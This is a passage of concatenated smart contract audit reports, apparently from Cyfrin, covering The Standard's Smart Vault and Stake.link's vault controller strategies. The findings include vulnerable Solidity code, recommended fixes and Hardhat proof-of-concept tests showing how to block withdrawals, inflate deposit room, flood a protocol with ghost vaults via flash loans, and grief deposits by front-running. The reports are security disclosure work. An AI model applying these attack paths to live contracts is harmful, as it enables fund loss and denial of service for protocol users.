**Description:** `SmartVault::removeAsset` allows Smart Vault owners to remove assets from their Vault, including collateral assets so long as the Vault remains fully collateralized. This currently works for ERC-20 collateral tokens; however, there is no handling for the case where `_tokenAddr == address(0)`. This address corresponds to the `NATIVE` symbol in the list of accepted `TokenManager` tokens, but native transfers attempted by `SafeERC20::safeTransfer` fail because this edge case is not considered.

```solidity
function removeAsset(address _tokenAddr, uint256 _amount, address _to) external onlyOwner {
    ITokenManager.Token memory token = getTokenManager().getTokenIfExists(_tokenAddr);
    if (token.addr == _tokenAddr && !canRemoveCollateral(token, _amount)) revert Undercollateralised();
    IERC20(_tokenAddr).safeTransfer(_to, _amount);
    emit AssetRemoved(_tokenAddr, _amount, _to);
}
```

While native collateral withdrawals are already correctly handled by `SmartVaultV4::removeCollateralNative`, this edge case results in an asymmetry between ERC-20 and native asset transfers within `SmartVault::removeAsset`.

**Impact:** Smart Vault owners cannot use `SmartVault::removeAsset` to remove native tokens from their Vault.

**Recommended Mitigation:** Consider handling the case where the native asset is attempted to be removed. Also, the use of events should be reconsidered depending on whether the asset removed is a collateral asset.

```diff
function removeAsset(address _tokenAddr, uint256 _amount, address _to) external onlyOwner {
    ITokenManager.Token memory token = getTokenManager().getTokenIfExists(_tokenAddr);
    if (token.addr == _tokenAddr && !canRemoveCollateral(token, _amount)) revert Undercollateralised();
+   if(_tokenAddr == address(0)) {
+       (bool sent,) = payable(_to).call{value: _amount}("");
+       if (!sent) revert TransferError();
+   } else {
-   IERC20(_tokenAddr).safeTransfer(_to, _amount);
+        IERC20(_tokenAddr).safeTransfer(_to, _amount);
+   }
    emit AssetRemoved(_tokenAddr, _amount, _to);
}
```

**The Standard DAO:** Fixed by commits [`8257c4c`](https://github.com/the-standard/smart-vault/commit/8257c4c267fa86c2c237ff6a2acdcfe94bcfeb20) & [`57d5db4`](https://github.com/the-standard/smart-vault/commit/57d5db47e072d8730c0d0988217db8d66ef565d9).

**Cyfrin:** Verified, native collateral can now be removed via either function.

\clearpage
## Gas Optimization


### Unnecessary call to `SmartVaultV4::usdCollateral` when depositing/withdrawing collateral to/from yield positions

**Description:** When depositing/withdrawing collateral to/from yield positions in `SmartVaultV4`, the Smart Vault is validated to remain sufficiently collateralized and the collateral value is validated to have not dropped by more than 10%:

```solidity
if (undercollateralised() || significantCollateralDrop(_preDepositCollateral, usdCollateral())) revert Undercollateralised();
```

This logic calls [`SmartVaultV4::usdCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L105-L114) to obtain the value of the Smart Vault collateral; however, this is an expensive call that performs multiple loops over collateral tokens and is also invoked within [`SmartVaultV4::undercollateralised`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L142-L144):

```solidity
function undercollateralised() public view returns (bool) {
    return minted > maxMintable(usdCollateral());
}
```

**Recommended Mitigation:** Consider calling `usdCollateral()` only once after the deposit/withdrawal of collateral, then pass that value to `undercollaterlised()` and `significantCollateralDrop()`. The current implementation of `undercollateralised()` can be refactored into a public function that calls `usdCollateral()` and passes the result to an internal `_undercollateralised()` function that takes the collateral value as argument.

**The Standard DAO:** Fixed by commit [`3fdefc8`](https://github.com/the-standard/smart-vault/commit/3fdefc8d9b4f46aad33993a26ca5a04defdf740a).

**Cyfrin:** Verified, a private function has been introduced.


### Cached `_token0` not used

**Description:** In [`SmartVaultYieldManager::_swapToSingleAsset`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultYieldManager.sol#L114-L117), the cached address `_token0` is not used in the condition of the ternary operation:

```solidity
address _token0 = IHypervisor(_hypervisor).token0();
address _unwantedToken = IHypervisor(_hypervisor).token0() == _wantedToken ?
    IHypervisor(_hypervisor).token1() :
    _token0;
```

**Recommended Mitigation:** Use the cached `_token0` variable in the comparison.

**The Standard DAO:** Fixed by commit [`1c30144`](https://github.com/the-standard/smart-vault/commit/1c3014465689d75d1fc057cadb5cdd75d8f18a2d).

**Cyfrin:** Verified, the cached address is now used.

\clearpage

------ FILE END car/reports_md/2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md ------


------ FILE START car/reports_md/2024-09-17-cyfrin-stake-link-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

[Hans](https://twitter.com/hansfriese)

**Assisting Auditors**



---

# Findings
## Critical Risk


### Implicit assumption of sequentially filling of vaults in `CommunityVCS::getDepositChange` causes direct losses to stakers

**Description:** The `getDepositChange` function in the CommunityVCS contract can lead to significant underreporting of the total balance in the protocol. The function is designed with an assumption that vaults are filled sequentially, but this assumption can easily be violated with withdrawals.

Vault ID's in a given `curUnbondedVaultGroup` are not sequential but separated by the `numVaultGroups` which is set to 5 for Community Vault Controller Strategy. If there is a full withdrawal at any index, the `getDepositChange` will stop including the deposits for all subsequent vaults.

The vulnerable code in CommunityVCS:

```solidity
function getDepositChange() public view override returns (int) {
    uint256 totalBalance = token.balanceOf(address(this));
    for (uint256 i = 0; i < vaults.length; ++i) {
        uint256 vaultDeposits = vaults[i].getTotalDeposits();
        if (vaultDeposits == 0) break;
        totalBalance += vaultDeposits;
    }
    return int(totalBalance) - int(totalDeposits);
}
```

This function stops counting at the first empty vault it encounters. When StakingPool calls `updateDeposits`, the incorrect change is then used to update the `totalStaked` value. This causes an accounting loss to the users as the `totalStaked` would artificially reduce, similar to what happens during slashing.


**Impact:** Total deposits of non-sequential vaults are not counted towards `totalBalance` if there is an empty vault with a lower index. This has a similar effect of slashing. Key effects are:
- `TotalStaked` on Staking Pool drops causing a direct loss to stakers
- Fee receivers do not accrue a fee

**Proof of Concept:** Below POC shows that if the first vault is fully withdrawn, `getDepositChange` stops including the vault deposits for all the subsequent vaults.

```javascript
it(`sequential deposits assumption in Community VCS can be attacked`, async () => {
    const {
      accounts,
      adrs,
      token,
      rewardsController,
      stakingController,
      strategy,
      stakingPool,
      updateVaultGroups,
    } = await deployCommunityVaultFixture()

    await strategy.deposit(toEther(1200), encodeVaults([]))

    await updateVaultGroups([0, 5, 10], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([1, 6, 11], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([2, 7], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([3, 8], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([4, 9], 300)
    await time.increase(claimPeriod)
    await updateVaultGroups([0, 5, 10], 300)

    //@audit withdraw from the first vault
    await strategy.withdraw(toEther(100), encodeVaults([1]))

    let vaults = await strategy.getVaults()

    let totalDeposits = 0

    for (let i = 0; i < 15; i++) {
      let vault = await ethers.getContractAt('CommunityVault', vaults[i])
      totalDeposits += fromEther(await vault.getTotalDeposits())
    }

    console.log(`total deposits`, totalDeposits)
    assert.equal(totalDeposits, 1100) //@audit 1200 (deposit) - 100 (withdrawn)

    // const strategyTokenBalance = fromEther(await token.balanceOf(adrs.strategy))
    // console.log(`strategy token balance`, totalDepositsCalculated)
    const depositChange = fromEther(await strategy.getDepositChange())

    assert.equal(depositChange, -1000) //@audit This is equivalent to slashing
    //@audit -> deposit Change should be 0 at this point, instead it is -1000
    //@audit only the 0'th vault deposit is considered in the deposit change calculation
  })
```
**Recommended Mitigation:** Consider using the base implementation for `getDepositChange`. With the current withdrawal logic, a sequential deposit assumption can be easily violated.

**Stake.link**
Fixed in [e349a7d](https://github.com/stakedotlink/contracts/pull/108/commits/e349a7d20b5bd45400652f76e38019d6df764327)

**Cyfrin**
Verified. `getDepositChange` override removed in `CommunityVCS`.


### Storage gap discrepancy during upgrade causes storage collision in vault controller strategies

**Description:** Both [`CommunityVCS`](https://etherscan.io/address/0x96418d70832d08cf683be81ee9890e1337fad41b#code) and [`OperatorVCS`](https://etherscan.io/address/0x584338dabae9e5429c334fc1ad41c46ac007bc29#code) are upgradeable contracts that are already deployed on mainnet.

The contracts audited are intended to upgrade these. There is however an issue with the storage gap in the inherited contract `VaultControllerStrategy`:


The `VaultControllerStrategy` used as base in the deployed contracts have its storage setup like this:
```solidity
    IStaking public stakeController;       // 1
    Fee[] internal fees;                   // 2

    address public vaultImplementation;    // 3

    IVault[] internal vaults;              // 4
    uint256 internal totalDeposits;        // 5
    uint256 public totalPrincipalDeposits; // 6
    uint256 public indexOfLastFullVault;   // 7

    uint256 public maxDepositSizeBP;       // 8

    uint256[9] private __gap;              // 8 + 9 = 17
```

And in the upgraded code from `VaultControllerStrategy`:
```solidity
    IStaking public stakeController;               // 1
    Fee[] internal fees;                           // 2

    address public vaultImplementation;            // 3

    IVault[] internal vaults;                      // 4
    uint256 internal totalDeposits;                // 5
    uint256 public totalPrincipalDeposits;         // 6

    uint256 public maxDepositSizeBP;               // 7

    IFundFlowController public fundFlowController; // 8
    uint256 internal totalUnbonded;                // 9

    VaultGroup[] public vaultGroups;               // 10
    GlobalVaultState public globalVaultState;      // 11
    uint256 internal vaultMaxDeposits;             // 12

    uint256[6] private __gap;                      // 12 + 6 = 18!
```

There are four new slots added, `totalUnbonded`, `vaultGroups`, `globalVaultState` and `vaultMaxDeposits` however the gap is only decreased by 3 (`9` -> `6`). Hence the total storage slots used by the upgraded `VaultControllerStrategy` will increase by `1` encroaching on the storage of the `Community` and `OperatorVCS` implenentations.

Note, there is also some variables that have been moved and renamed (`maxDepositSizeBP` and `indexOfLastFullVault`) but that is handled in the `initializer`

**Impact:** For `CommunityVCS` the impact is quite moderate. This is the storage `CommunityVCS`:
```solidity
contract CommunityVCS is VaultControllerStrategy {
    uint128 public vaultDeploymentThreshold;
    uint128 public vaultDeploymentAmount;
```
The extra gap will lead to that `vaultDeploymentThreshold` will get the value of `vaultDeploymentAmount` (`6` on chain at time of writing). And `vaultDeploymentAmount` will be `0`.

These are used in `CommunityVCS::performUpkeep`:
```solidity
    function performUpkeep(bytes calldata) external {
        if ((vaults.length - globalVaultState.depositIndex) >= vaultDeploymentThreshold)
            revert VaultsAboveThreshold();
        _deployVaults(vaultDeploymentAmount);
    }
```
Since `vaultDeploymentAmount` is `0` no new vaults will be deployed until the issue is discovered and the values updated (using `setVaultDeploymentParams`).

This will at most cause deposits to be blocked for a while since no new vaults will be deployed.

For `OperatorVCS` however, the impact is more severe:
Here's the storage layout of `OperatorVCS`:
```solidity
contract OperatorVCS is VaultControllerStrategy {
    using SafeERC20Upgradeable for IERC20Upgradeable;

    uint256 public operatorRewardPercentage;
    uint256 private unclaimedOperatorRewards;
```
`operatorRewardPercentage` will get the value of `unclaimedOperatorRewards` (`4914838471043033862842`, `4.9e21` at time or writing).

This is used in `OperatorVault` to calculate the portion of the rewards earned that should go to the operator:
```solidity
            opRewards =
                (uint256(depositChange) *
                    IOperatorVCS(vaultController).operatorRewardPercentage()) /
                10000;
```
This is ultimately triggered by calling `StakingPool::updateStrategyRewards` that is in-turn called periodically by the protocol.  If `updateStrategyRewards` (which in turn calls `OperatorVault::updateDeposits`) is called before the storage collision is discovered, the `OperatorVaults` will be handing out an enormous amount of reward shares to the operators. This will greatly diminish the value of each share held by anyone else and any operator who withdraws these can take a lot of `LINK` from the pool.

`StakingPool::updateStrategyRewards` is also callable by anyone hence a malicious operator could figure this out and backrun the upgrade by calling this themselves.

**Recommended Mitigation:** Considering reducing the storage gap in the upgraded `VaultControllerStrategy` to `5`

**Stake.link**
Fixed in [3107a31](https://github.com/stakedotlink/contracts/pull/108/commits/3107a31485a84d699e127648e85a43573de31390)

**Cyfrin**
Verified. Storage gap correctly assigned.

\clearpage
## High Risk


### Lack of access control in `FundController::performUpkeep` can allow an attacker to block withdrawals

**Description:** Anyone can perform upkeep on the `FundFlowController`. This will rotate the unbonded vault groups in the vault controllers through `VaultControllerStrategy::updateVaultGroups`.

The user calling `FundFlowController::performUpkeep` also provides the details to `VaultControllerStrategy::updateVaultGroups`, the vaults to unbond in the Chainlink staking pool and the new `totalUnbonded` amount:
```solidity
    function updateVaultGroups(
        uint256[] calldata _curGroupVaultsToUnbond,
        uint256 _nextGroup,
        uint256 _nextGroupTotalUnbonded
    ) external onlyFundFlowController {
        for (uint256 i = 0; i < _curGroupVaultsToUnbond.length; ++i) {
            vaults[_curGroupVaultsToUnbond[i]].unbond();
        }

        globalVaultState.curUnbondedVaultGroup = uint64(_nextGroup);
        totalUnbonded = _nextGroupTotalUnbonded;
    }
```
None of these two parameters are validated. Hence a user could provide any vaults to unbond or any new `totalUnbonded` amount.

**Impact:** Providing `0` as `_nextGroupTotalUnbonded` would effectively block withdrawals because of this check in `VaultControllerStrategy::withdraw`:
```solidity
    function withdraw(uint256 _amount, bytes calldata _data) external onlyStakingPool {
        if (!fundFlowController.claimPeriodActive() || _amount > totalUnbonded)
            revert InsufficientTokensUnbonded();
```

Since  `FundFlowController::performUpkeep` can only be called at certain times (when new vaults are available to be unbonded) this could block withdrawals until it could be called the next time. At which time the attacker could call this again to continue to block withdrawals.

Setting `totalUnbonded` to `0`, although less impactful, would also break depositing into vaults with active unbonding in `_depositToVaults`:
```solidity
                if (vault.unbondingActive()) {
                    totalRebonded += deposits;
                }
...

        if (totalRebonded != 0) totalUnbonded -= totalRebonded;
```

Providing erroneous vaults could be used to reorder which vaults are available to withdraw from causing disruptions in withdrawals. Since `FundFlowController` and `VaultControllerStrategy` assumes that all vaults with deposits in the group are available when the group is active.

**Proof of Concept:** Two tests, one for `totalUnbonded` and one for the unbonded vaults, that can be added to `vault-controller-strategy.test.ts`:
```javascript
  it('performUpkeep, updateVaultGroups can be called by anyone and lacks validation for totalUnbonded', async () => {
    const { adrs, strategy, token, stakingController, vaults, updateVaultGroups } =
      await loadFixture(deployFixture)

    // Deposit into vaults
    await strategy.deposit(toEther(500), encodeVaults([]))
    assert.equal(fromEther(await token.balanceOf(adrs.stakingController)), 500)
    for (let i = 0; i < 5; i++) {
      assert.equal(fromEther(await stakingController.getStakerPrincipal(vaults[i])), 100)
    }
    assert.equal(Number((await strategy.globalVaultState())[3]), 5)

    // do the initial rotation to get a vault into claim period
    await updateVaultGroups([0, 5, 10], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([1, 6, 11], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([2, 7], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([3, 8], 0)
    await time.increase(claimPeriod)

    // user calls `fundFlowController.performUpkeep` with erroneous `totalUnbonded`
    await updateVaultGroups([4, 9], 0)

    // causing withdrawals to stop working
    await expect(
      strategy.withdraw(toEther(50), encodeVaults([0, 5]))
    ).to.be.revertedWithCustomError(strategy, 'InsufficientTokensUnbonded()')
  })

  it('performUpkeep, updateVaultGroups can be called by anyone and lacks validation for unbonded vaults', async () => {
    const { adrs, strategy, token, stakingController, vaults, updateVaultGroups } =
      await loadFixture(deployFixture)

    // Deposit into vaults
    await strategy.deposit(toEther(500), encodeVaults([]))
    assert.equal(fromEther(await token.balanceOf(adrs.stakingController)), 500)
    for (let i = 0; i < 5; i++) {
      assert.equal(fromEther(await stakingController.getStakerPrincipal(vaults[i])), 100)
    }
    assert.equal(Number((await strategy.globalVaultState())[3]), 5)

    // calling `fundFlowController.performUpkeep` with vaults in other groups
    await updateVaultGroups([0, 1, 2, 3, 4], 0)
    await time.increase(claimPeriod)
    await expect(
      updateVaultGroups([1, 6, 11], 0)
    ).to.be.revertedWithCustomError(stakingController, 'UnbondingPeriodActive()')
  })
```

**Recommended Mitigation:** Consider not allowing the user to provide any vaults or amounts at all. `FundFlowController` has a `view` function `checkUpkeep` which collects all this data.

We recommend combining `checkUpkeep` and `performUpkeep` to be linked so that the caller won't provide any data. This would also address issue 7.3.6 [*Potential stale data in `FundFlowController::performUpkeep` can lead to incorrect state updates*](#potential-stale-data-in-fundflowcontrollerperformupkeep-can-lead-to-incorrect-state-updates)

**Stake.link**
Fixed in [53d6090](https://github.com/stakedotlink/contracts/pull/108/commits/53d60901c171f4b436dcb4b22fe6549ba5dcef05)

**Cyfrin**
Verified. `performUpkeep` no longer takes encoded inputs.


### Attacker can potentially inflate total deposit room in vault group to near infinity

**Description:** The `VaultControllerStrategy::deposit` function increases `totalDepositRoom` based on the difference between `maxDeposits` (from Chainlink) and `vaultMaxDeposits`, but fails to update `vaultMaxDeposits` afterwards. As a result, on every deposit, vault group deposit room increases by `maxDeposits - vaultMaxDeposits`, regardless of the actual deposit amount.

Furthermore, the `StakingPool` contract, which interacts with `VaultControllerStrategy`, has a public `depositLiquidity` function that can be called by any user. This function uses the current balance of the `StakingPool` contract for deposits, which can be manipulated by transferring small amounts of tokens directly to the contract.

The combination of these issues could allow a malicious actor to:
- Manipulate the deposit process by calling depositLiquidity in StakingPool with carefully crafted data after transferring a small amount of tokens to the contract.
- Artificially inflate `totalDepositRoom` in VaultControllerStrategy by repeatedly triggering the deposit function.

Note that this attack vector is possible whenever Chainlink increases its vault limits.

**Impact:** Vault group total deposit room can be increased by attacker to near infinity by repeatedly calling deposits. This has 2 severe side-effects

- Unused vaults will never see any deposits even when vaults with ids less than deposit index are full
- Since withdrawals increase deposit room continuously, it is likely that a repeated attack, in the extreme case, can cause an deposit room overflow and thus block all withdrawals.


**Proof of Concept:**
```typescript
  it('inflate deposit room in vault groups to infinity', async () => {
    const {
      token,
      accounts,
      signers,
      adrs,
      strategy,
      priorityPool,
      stakingPool,
      stakingController,
      rewardsController,
      vaults,
    } = await loadFixture(deployFixture)

    const [, totalDepRoomBefore] = await strategy.vaultGroups(1)
    await stakingController.setDepositLimits(toEther(10), toEther(120))
    await stakingPool.deposit(accounts[0], 1 /*dust amount*/, [encodeVaults([0, 1, 2, 3, 4])])
    const [, totalDepRoomAfterFirstDeposit] = await strategy.vaultGroups(0)

    //@audit after first deposit, deposit room increases to 20 ether
    assert.equal(fromEther(totalDepRoomAfterFirstDeposit), 20)
    await stakingPool.deposit(accounts[0], 1 /*dust amount*/, [encodeVaults([4])])

    //@audit after first deposit, deposit room increases to 40 ether
    const [, totalDepRoomAfterSecondDeposit] = await strategy.vaultGroups(0)
    assert.equal(fromEther(totalDepRoomAfterSecondDeposit), 40)

    //@audit this can theoretically increase to infinity - disrupting the deposit logic
  })
```

**Recommended Mitigation:** Update vaultMaxDeposits once all vault group total deposit rooms are updated.


**Stake.link**
Fixed in [04c2f10](https://github.com/stakedotlink/contracts/pull/108/commits/04c2f105cde784cb8b0f89f3fb835090213fa13d)

**Cyfrin**
Verified. `vaultMaxDeposits` is correctly updated.


### Incorrect Handling of Deposit Data in FundFlowController

**Description:** The `getDepositData` function in the `FundFlowController` contract incorrectly handles the case when operator vaults can accommodate all deposits. This leads to empty deposit data being passed to operator vaults, potentially causing deposits to fail or be misallocated.

Relevant code snippet from `FundFlowController`:

```solidity
function getDepositData(uint256 _toDeposit) external view returns (bytes[] memory) {
    uint256 toDeposit = 2 * _toDeposit;
    bytes[] memory depositData = new bytes[](2);

    (
        uint64[] memory opVaultDepositOrder,
        uint256 opVaultsTotalToDeposit
    ) = _getVaultDepositOrder(operatorVCS, toDeposit);
    depositData[0] = abi.encode(opVaultDepositOrder);

    if (opVaultsTotalToDeposit < toDeposit) {
        (uint64[] memory comVaultDepositOrder, ) = _getVaultDepositOrder(
            communityVCS,
            toDeposit - opVaultsTotalToDeposit
        );
        depositData[1] = abi.encode(comVaultDepositOrder);
    } else {
        depositData[0] = abi.encode(new uint64[](0)); // @audit: Should be depositData[1]
    }

    return depositData;
}
```

Note that the depositData[0] that contains the vault ID order is deleted when operator vaults can handle full deposit. This treatment is also inconsistent with the `getWithdrawalData` function that correctly encodes only `withdrawalData[0]` in both the `if-else` logic flow.

```solidity
function getWithdrawalData(uint256 _toWithdraw) external view returns (bytes[] memory) {
    uint256 toWithdraw = 2 * _toWithdraw;
    bytes[] memory withdrawalData = new bytes[](2);

    (
        uint64[] memory comVaultWithdrawalOrder,
        uint256 comVaultsTotalToWithdraw
    ) = _getVaultWithdrawalOrder(communityVCS, toWithdraw);
    withdrawalData[1] = abi.encode(comVaultWithdrawalOrder);

    if (comVaultsTotalToWithdraw < toWithdraw) {
        (uint64[] memory opVaultWithdrawalOrder, ) = _getVaultWithdrawalOrder(
            operatorVCS,
            toWithdraw - comVaultsTotalToWithdraw
        );
        withdrawalData[0] = abi.encode(opVaultWithdrawalOrder);
    } else {
        withdrawalData[0] = abi.encode(new uint64[](0)); //@audit correctly encoding this instead of withdrawalData[1]
    }

    return withdrawalData;
}
```

**Impact:** `getDepositData` is called by the `PPKeeper` contract to compute the vaultId's that are passed to the priority pool to deposit queued tokens. This bug can cause deposits to fail or be misallocated when operator vaults have sufficient capacity to handle all deposits.


**Recommended Mitigation:** Consider modifying the `getDepositData` function to correctly handle the case when operator vaults can accommodate all deposits. The corrected code should be:

```diff
if (opVaultsTotalToDeposit < toDeposit) {
    (uint64[] memory comVaultDepositOrder, ) = _getVaultDepositOrder(
        communityVCS,
        toDeposit - opVaultsTotalToDeposit
    );
    depositData[1] = abi.encode(comVaultDepositOrder);
} else {
-    depositData[0] = abi.encode(new uint64[](0));
+   depositData[1] = abi.encode(new uint64[](0));
}
```

**Stake.link**
Fixed in [7af3ec0](https://github.com/stakedotlink/contracts/pull/108/commits/7af3ec0b13303291b4c85975e2e353ca89ec51a6)

**Cyfrin**
Verified. Fixed as recommended.


### Call selector mismatch will cause unstaking to revert

**Description:** In the Chainlink staking the `StakingPoolBase::unstake` call looks like this:
```solidity
  function unstake(uint256 amount) external {
```
However in `Vault::withdraw` it is called like this:
```solidity
        stakeController.unstake(_amount, false);
```

**Impact:** Unstaking will not work until all vaults are updated.

**Recommended Mitigation:** Consider removing the `false` from `unstake`:
```diff
-       stakeController.unstake(_amount, false);
+       stakeController.unstake(_amount);
```

**Stake.link**
Fixed in [c563a62](https://github.com/stakedotlink/contracts/pull/108/commits/c563a6273d5fe586914c34c910bdef404458342b)

**Cyfrin**
Verified. Fixed as recommended.


### Flash loan attack can potentially create an unmanageable number of ghost vaults in CommunityVCS

**Description:** The current implementation of the `CommunityVCS` allows for a potential attack vector where an attacker can artificially inflate the number of vaults to an arbitrarily large number. This attack exploits the fact that `globalState.depositIndex` is monotonically increasing and is not reset when earlier vaults become empty. As a result, each iteration of this attack can push the `depositIndex` further, leading to the creation of ghost vaults which will never be used.

Consider following attack vector:
1. Obtain a flash loan for a large amount of tokens. Choose a token amount such that they trigger the `vaultDeploymentThreshold` condition
2. Deposit these tokens into the Priority Pool without specifying vault IDs.
3. This triggers a deposit into the Staking Pool, which in turn calls the deposit function of the CommunityVCS.
4. Since no vault IDs are provided, the deposit starts from `globalState.depositIndex` and continues until the deposit is fully allocated or all vaults are filled. This updates `globalState.depositIndex` to a bigger number
5. Call performUpkeep on CommunityVCS, which deploys new vaults.
6. Repeat steps 1-5
7. Assuming there is enough exit liquidity from all strategies in StakingPool, attacker can withdraw all deposited tokens to repay the flash loan

**Impact:** Managing an unnecessarily large number of vaults severely complicates protocol operations and maintenance. Critical functions like `updateDeposits`, which are essential for maintaining accurate vault accounting, become extremely expensive to execute. This is because the `getDepositChange` function, which tracks the latest total deposits across all vaults, must loop over every available vault. In extreme cases, this could lead to a denial-of-service condition for functions that need to iterate over all vaults

**Proof of Concept:**
```typescript
  it(`flash loan attack to max out community vaults`, async () => {
    const {
      token,
      accounts,
      signers,
      adrs,
      strategy,
      priorityPool,
      stakingPool,
      stakingController,
      rewardsController,
      updateVaultGroups,
    } = await loadFixture(deployCommunityVaultFixtureWithStrategyMock)
    //@note this fixture uses a strategy mock to simulate a strategy with a max deposit of 900 tokens
    //@note by now, that strategy is already full -> so any further deposits go into the Community VCS

    console.log(`strategies length ${(await stakingPool.getStrategies()).length}`)
    assert.equal((await strategy.getVaults()).length, 20)
    await stakingPool.deposit(accounts[0], toEther(1500), [encodeVaults([]), encodeVaults([])])

    // get initial deposit index
    const [, , , depositIndex] = await strategy.globalVaultState()
    console.log(`deposit index`, depositIndex.toString())

    await strategy.performUpkeep(encodeVaults([]))
    assert.equal((await strategy.getVaults()).length, 40) //@audit 20 new vaults are created

    await updateVaultGroups([0, 5, 10], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([1, 6, 11], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([2, 7], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([3, 8], 0)
    await time.increase(claimPeriod)
    await updateVaultGroups([4, 9], 300)

    //@note a user can flashloan 1100 tokens -> deposit them with no vaultIds -> deposit index moves to 26
    await stakingPool.setPriorityPool(adrs.priorityPool)
    await token.approve(adrs.strategy, ethers.MaxUint256)
    await token.connect(signers[2]).approve(priorityPool.target, ethers.MaxUint256)
    await priorityPool
      .connect(signers[2])
      .deposit(toEther(1100), false, [encodeVaults([]), encodeVaults([])])

    const [, , , newDepositIndex] = await strategy.globalVaultState()

    //@note user can then performUpkeep (or wait for keeper to do this) to further increase vaults to 60
    await strategy.performUpkeep(encodeVaults([]))
    assert.equal((await strategy.getVaults()).length, 60) //@audit 20 new vaults are created again

    //@note 300 is now available for withdrawal
    //@note 800 is withdrawable from first strategy
    //@note creating a mock staking pool to simulate this

    //@note 800 + 300 -> total withdrawable is 1100
    //@note user can then withdraw complete amount to repay flash without queueing

    await stakingPool.connect(signers[2]).approve(adrs.priorityPool, ethers.MaxUint256)
    await priorityPool
      .connect(signers[2])
      .withdraw(toEther(1100), toEther(1100), toEther(1100), [], false, false, [
        encodeVaults([]),
        encodeVaults([0, 5, 10]),
      ])
  })
```

**Recommended Mitigation:** Consider implementing a mechanism to recycle empty vaults instead of always creating new ones. Also to nullify the flash loan vectors, consider adding a time delay for withdrawals.

**Stake.link**
Fixed in [9dcac24](https://github.com/stakedotlink/contracts/pull/108/commits/9dcac2435db6d3a1e7d0d222e91b6ffadf99484d)

**Cyfrin**
Verified. Instant staking pool withdrawals disallowed. Also, the current vault group deposit room is also considered while depositing into vaults. Both changes combined mitigate the highlighted risk.

\clearpage
## Medium Risk


### `WithdrawalPool::withdrawalBatches` array is only every increasing in size potentially leading to Denial Of Service

**Description:** Every time withdrawals are finalized, a new batchId gets appended to `withdrawalBatches` array. Over time, this array is ever increasing and can lead to extremely large size. It is important to note that users can trigger a queuing of withdrawal by themselves.

**Impact:** Potential denial of service of `getBatchIds` and `getFinalizedWithdrawalIdsByOwner`

**Recommended Mitigation:** If `indexOfLastWithdrawal` for a batch is less than the ID of the first queued withdrawal (queuedWithdrawals[0]), it means all withdrawals in that batch and any preceding batches have been fully processed. This can be used to calculate a cut-off batch `id` on a periodic basis.

Consider the following implementation
- Find the cutoff batch: Iterate through withdrawalBatches from the beginning until you find the last batch where indexOfLastWithdrawal < queuedWithdrawals[0].
- Delete or archive: All batches up to and including this cutoff batch can be safely deleted or archived.

**Stake.link**
Fixed in [7889f75](https://github.com/stakedotlink/contracts/pull/108/commits/7889f75917d9481b5ca8fc66ceba2ac3f7f25371)

**Cyfrin**
Verified. Fixed as recommended.


### Attacker can deny users from depositing into priority pool by front-running call to StakingPool::depositLiquidity()

**Description:** The `VaultControllerStrategy` contract is susceptible to a front-running attack that can prevent priority pool from depositing user funds into specific vaults of a strategy. The vulnerability lies in the `deposit` function, which uses a `globalState.groupDepositIndex` to track the current deposit state. An attacker can exploit this by front-running legitimate deposits by calling `depositLiquidity` that deposits unused deposits into a strategy.

The griefing attack works as follows:

1. Priority pool prepares a transaction to deposit funds, specifying a list of vault IDs.
2. An attacker observes this pending transaction in the mempool.
3. The attacker quickly submits their own transaction that uses unused staking pool deposits, using the same vault IDs but with a higher gas price.
4. The attacker's transaction is processed first, updating the `globalState.groupDepositIndex`
5. When the priority pool transaction is processed, it fails due to an `InvalidVaultIds` error, as the `globalState.groupDepositIndex` no longer matches the expected value.

**Impact:** In certain scenarios, priority pool can be prevented from depositing user funds, effectively creating a denial of service condition for the deposit functionality. It is noteworthy that an attacker need not use his own funds to execute the attack but use the unused staking pool deposits (when available) to grief other depositors.

**Proof of Concept:**
```typescript
it('front-running deposit to change deposit index', async () => {
    const {
      token,
      accounts,
      signers,
      adrs,
      strategy,
      priorityPool,
      stakingPool,
      stakingController,
      rewardsController,
      vaults,
    } = await loadFixture(deployFixture)

    await token.transfer(await stakingPool.getAddress(), toEther(100)) //depositing to represent unused liquidity in staking pool
    //@audit front-run priority pool deposit
    await stakingPool.connect(signers[2]).depositLiquidity([encodeVaults([0, 1, 2, 3, 4])]) // anyone can deposit this

    //@audit actual deposit is DOSed as the group deposit index has changed
    await expect(
      priorityPool.connect(signers[2]).deposit(toEther(100), false, [encodeVaults([0, 1, 3, 4])])
    ).to.be.revertedWithCustomError(strategy, 'InvalidVaultIds()')
  })
```

**Recommended Mitigation:** Consider one of the alternatives:
- Gate the `StakingPool::depositLiquidity` function to prevent unauthorized access
- Redesign the deposit mechanism to not rely on sequential vault IDs or a global deposit index. Instead, use a more robust method for managing deposits that is resistant to order manipulation.

**Stake.link**
Fixed in [27b3008](https://github.com/stakedotlink/contracts/pull/108/commits/27b300875914134238f1d556fbb41244ba931625)

**Cyfrin**
Verified. `depositLiquidity` is now a private function.


### No way to recover principal if an operator is removed by Chainlink

**Description:** Chainlink can remove operators from the [OperatorStakingPool](https://etherscan.io/address/0xa1d76a7ca72128541e9fcacafbda3a92ef94fdc5#code). This will stop the Operator from accruing any more rewards by removing their principal. Their principal is not lost however, it is still available though by calling `OperatorStakingPool::unstakeRemovedPrincipal`.

In the `OperatorVault` there is no call like this. If an OperatorVault got removed as operator in the chainlink staking pool the pool principal would be locked.

**Impact:** The funds could eventually be recovered by an upgrade to the vault but that is a long process and until then, the vault behavior would be imperfect as the removed principal is included in the vault principal:
```solidity
114:    function getPrincipalDeposits() public view override returns (uint256) {
115:        return
116:            super.getPrincipalDeposits() +
